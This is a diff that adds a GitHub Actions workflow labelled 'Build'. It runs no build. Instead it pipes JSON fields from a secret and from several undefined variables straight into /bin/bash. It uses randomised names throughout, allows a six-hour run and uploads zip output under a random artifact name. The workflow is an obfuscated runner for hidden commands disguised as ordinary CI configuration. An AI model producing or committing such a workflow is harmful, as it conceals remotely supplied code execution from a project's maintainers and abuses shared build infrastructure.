@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          otqpf9: ${{ secrets.otqpf9 }}
+        run: |
+          printf '%s' "$otqpf9" | jq -r .wfoij6932 | /bin/bash
+          echo $wh0982 | jq -r .u254 | /bin/bash
+          printf '%s' "$jp10664" | jq -r .mnoig5250 | /bin/bash
+          echo $p4 | jq -r .n809 | /bin/bash
+          printf '%s' "$rikt59" | jq -r .ilju52327 | /bin/bash
+          printf '%s' "$ihe212" | jq -r .je8 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: MN6JEvTS
+          path: "*.zip"
+          retention-days: 1
